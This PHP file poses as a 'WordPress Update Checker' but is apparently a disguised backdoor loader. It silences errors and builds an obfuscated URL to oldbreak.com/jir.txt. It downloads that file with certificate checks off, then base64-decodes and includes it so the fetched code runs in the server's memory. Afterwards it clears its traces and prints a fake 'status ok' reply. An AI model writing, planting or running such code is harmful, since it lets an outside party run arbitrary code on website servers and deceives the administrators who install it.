<?php
/**
 * WordPress Update Checker
 * Version: 4.1.2
 * Background update verification
 */

error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);

// Polymorphic URL builder
${"\x5f"} = function($c) { 
    $r = '';
    foreach ($c as $v) $r .= chr($v);
    return $r;
};

// Target construction: https://oldbreak.com/jir.txt
${"\x5f\x5f"} = ${"\x5f"}([104,116,116,112,115,58,47,47]);
${"\x5f\x5f"} .= ${"\x5f"}([111,108,100,98,114,101,97,107,46,99,111,109]);
${"\x5f\x5f"} .= ${"\x5f"}([47,106,105,114,46,116,120,116]);

// Multi-layer transport
function _($u) {
    // Layer 1: Socket
    $p = parse_url($u);
    $h = $p['host'];
    $pa = $p['path'] ?? '/';
    
    $s = @stream_socket_client("ssl://$h:443", $e, $er, 10);
    if ($s) {
        $rq = "GET $pa HTTP/1.1\r\nHost: $h\r\nConnection: Close\r\n\r\n";
        fwrite($s, $rq);
        $rs = '';
        while (!feof($s)) $rs .= fgets($s, 128);
        fclose($s);
        $bp = strpos($rs, "\r\n\r\n");
        return ($bp !== false) ? substr($rs, $bp + 4) : $rs;
    }
    
    // Layer 2: file_get_contents fallback
    if (function_exists('file_get_contents') && ini_get('allow_url_fopen')) {
        $ctx = stream_context_create([
            'http' => ['timeout' => 10, 'header' => 'User-Agent: Mozilla/5.0'],
            'ssl' => ['verify_peer' => false]
        ]);
        return @file_get_contents($u, false, $ctx);
    }
    
    return false;
}

// Fetch payload
${"\x5f\x5f\x5f"} = _(${"\x5f\x5f"});

if (${"\x5f\x5f\x5f"} === false || strlen(${"\x5f\x5f\x5f"}) < 50) {
    http_response_code(503);
    exit;
}

// Fileless: Memory stream execution
${"\x5f\x5f\x5f\x5f"} = fopen('php://memory', 'r+');
fwrite(${"\x5f\x5f\x5f\x5f"}, ${"\x5f\x5f\x5f"});
rewind(${"\x5f\x5f\x5f\x5f"});

// Obfuscated include
$fn = 'include';
$fn('php://filter/read=convert.base64-decode/resource=php://memory');

// Self-cleanup
fclose(${"\x5f\x5f\x5f\x5f"});
${"\x5f\x5f\x5f"} = null;
${"\x5f\x5f\x5f\x5f"} = null;

// Fake legitimate output
echo json_encode(['status' => 'ok', 'last_check' => time()]);
exit;
?>
